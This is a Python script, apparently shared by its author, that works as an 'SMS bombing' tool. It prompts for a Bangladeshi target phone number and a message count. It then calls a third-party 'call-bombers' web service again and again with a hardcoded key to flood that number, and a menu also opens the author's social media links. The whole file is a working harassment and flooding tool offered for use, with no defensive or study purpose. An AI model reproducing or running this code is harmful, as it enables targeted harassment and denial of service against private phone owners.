import os
import sys
import time
import requests

# ANSI Colors
RED = "\033[1;31m"
GREEN = "\033[1;32m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

def print_logo():
    logo = f"""
{RED}
   ______ ____  _____  _    _          _____   
  |  ____/ __ \|  __ \| |  | |   /\   |  __ \  
  | |__ | |  | | |__) | |__| |  /  \  | |  | | 
  |  __|| |  | |  _  /|  __  | / /\ \ | |  | | 
  | |   | |__| | | \ \| |  | |/ ____ \| |__| | 
  |_|    \____/|_|  \_\_|  |_/_/    \_\_____/  
{RESET}
"""
    print(logo)

def open_social_link(choice):
    links = {
        '1': "https://facebook.com/forhadhasan995",
        '2': "https://github.com/Forhadj",
        '3': "https://t.me/f_forhad",
        '4': "https://youtube.com/@forhad2.00"
    }
    if choice in links:
        print(f"{CYAN}Opening link: {links[choice]}{RESET}")
        if sys.platform.startswith('linux') or sys.platform == 'darwin':
            os.system(f"xdg-open {links[choice]} 2>/dev/null")
        elif sys.platform.startswith('win'):
            os.system(f"start {links[choice]}")
        else:
            print(f"{RED}Cannot open links on this platform.{RESET}")
        time.sleep(1)
    else:
        print(f"{RED}Invalid option!{RESET}")

def send_sms(phone_number, key, repeat):
    success_count = 0
    for i in range(repeat):
        url = f"https://call-bombers.vercel.app/send-call?key={key}&number={phone_number}&repeat=1"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200 and "success" in response.text.lower():
                print(f"{GREEN}[{i+1}/{repeat}] SMS sent successfully to {phone_number}{RESET}")
                success_count += 1
            else:
                print(f"{RED}[{i+1}/{repeat}] Failed to send SMS. Status: {response.status_code}{RESET}")
        except Exception as e:
            print(f"{RED}[{i+1}/{repeat}] Error: {e}{RESET}")
        time.sleep(1)
    print(f"{GREEN}Total successful requests: {success_count}/{repeat}{RESET}")

def start_sms_bombing():
    print(f"{CYAN}Enter the target phone number (without country code, e.g. 01XXXXXXXXX):{RESET}")
    phone = input("Phone number: ").strip()
    if not phone.startswith('01'):
        print(f"{RED}Please enter a valid Bangladeshi number starting with 01{RESET}")
        return
    print(f"{CYAN}How many SMS do you want to send?{RESET}")
    try:
        count = int(input("Count: "))
    except:
        print(f"{RED}Invalid number.{RESET}")
        return

    key = "Gift By DH Alamin"  # Use provided key

    print(f"{GREEN}Starting SMS bombing to {phone} with {count} messages...{RESET}")
    send_sms(phone, key, count)
    print(f"{GREEN}SMS bombing process finished.{RESET}")

def main_menu():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print_logo()
        print(f"{CYAN}Select an option from the menu:{RESET}")
        print(f"{GREEN}1.{RESET} Start SMS Bombing")
        print(f"{GREEN}2.{RESET} Open Social Links")
        print(f"{GREEN}0.{RESET} Exit")

        choice = input("Your choice: ").strip()

        if choice == '1':
            start_sms_bombing()
            input(f"\n{CYAN}Press Enter to return to the main menu...{RESET}")
        elif choice == '2':
            print(f"{CYAN}Social Links:{RESET}")
            print(f"{GREEN}1.{RESET} Facebook")
            print(f"{GREEN}2.{RESET} GitHub")
            print(f"{GREEN}3.{RESET} Telegram")
            print(f"{GREEN}4.{RESET} YouTube")
            print(f"{GREEN}0.{RESET} Back to Main Menu")

            link_choice = input("Which link do you want to open? ").strip()
            if link_choice == '0':
                continue
            else:
                open_social_link(link_choice)
            input("Press Enter to return to main menu...")
        elif choice == '0':
            print(f"{RED}Exiting... Goodbye!{RESET}")
            break
        else:
            print(f"{RED}Invalid choice, try again.{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{RED}Interrupted! Exiting...{RESET}")
        sys.exit()
